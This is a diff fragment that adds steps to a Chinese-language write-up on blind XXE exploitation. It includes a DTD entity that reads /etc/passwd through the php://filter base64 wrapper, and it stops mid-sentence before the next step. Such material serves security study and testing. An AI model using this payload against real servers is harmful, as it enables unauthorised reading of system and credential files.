@@ -55,3 +55,8 @@ Connection: close
 
 ![](assets/无回显XXE/file-20260105224253471.png)
 
+首先在1.dtd写好嵌套php伪协议的file协议读取/passwd
+```dtd
+<!ENTITY guc SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+```
+然后再定义一段
